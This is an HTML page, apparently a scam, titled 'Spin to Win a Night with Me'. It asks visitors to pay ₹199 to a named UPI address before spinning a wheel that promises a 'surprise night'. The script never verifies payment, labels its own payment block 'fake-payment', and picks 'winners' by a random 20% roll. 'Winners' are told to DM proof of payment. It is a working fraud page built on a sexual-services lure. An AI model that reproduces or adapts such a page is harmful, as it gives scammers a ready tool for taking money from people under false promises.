<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Spin to Win a Night</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom right, #000, #330033);
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      text-align: center;
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 1rem;
    }
    #wheel {
      width: 300px;
      height: 300px;
      border-radius: 50%;
      border: 10px solid #ff69b4;
      box-shadow: 0 0 30px hotpink;
      background: url('https://i.imgur.com/IT4sRzo.png'); /* Visual wheel */
      background-size: cover;
      transition: transform 4s ease-out;
      margin-bottom: 2rem;
    }
    #spinBtn {
      padding: 1rem 2rem;
      font-size: 1.2rem;
      background: hotpink;
      border: none;
      border-radius: 10px;
      color: black;
      cursor: pointer;
      box-shadow: 0 0 15px hotpink;
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    .note {
      font-size: 0.9rem;
      margin-top: 1rem;
      opacity: 0.8;
    }
    #result {
      margin-top: 1.5rem;
      font-size: 1.2rem;
      color: #ff69b4;
    }
    #fake-payment {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #111;
      padding: 1rem;
      border-radius: 15px;
      box-shadow: 0 0 10px hotpink;
    }
    #fake-payment img {
      width: 200px;
      margin-bottom: 0.5rem;
    }
    audio { display: none; }
  </style>
</head>
<body>
  <h1>Spin to Win a Night with Me</h1>
  <div id="wheel"></div>
  <button id="spinBtn">Pay ₹199 & Spin</button>
  <div class="note">Only 1 lucky winner each day. Will it be you?</div>
  <div id="result"></div>  <div id="fake-payment">
    <img src="https://i.imgur.com/xR2Fdv3.png" alt="UPI QR Code" />
    <p>Scan & Pay ₹199 to: <strong>keanjohn72@oksbi</strong></p>
    <button onclick="doSpin()" style="margin-top:10px;padding:0.5rem 1rem;background:hotpink;border:none;border-radius:5px;color:black;">I Paid, Spin Now</button>
  </div><audio id="music" src="https://files.catbox.moe/5iozwo.mp3" autoplay loop></audio>

  <script>
    let wheel = document.getElementById("wheel");
    let spinBtn = document.getElementById("spinBtn");
    let result = document.getElementById("result");
    let fakePayment = document.getElementById("fake-payment");

    spinBtn.onclick = function () {
      spinBtn.style.display = 'none';
      fakePayment.style.display = 'flex';
    };

    function doSpin() {
      let rotation = 3600 + Math.floor(Math.random() * 720);
      wheel.style.transform = `rotate(${rotation}deg)`;
      result.textContent = "Spinning...";

      setTimeout(() => {
        let won = Math.random() < 0.2;
        if (won) {
          result.innerHTML = "<strong>You WON!</strong> DM me your payment proof for a surprise night you'll never forget.";
        } else {
          result.textContent = "So close! Try again, your lucky night is near.";
        }
      }, 4500);
    }
  </script></body>
</html>
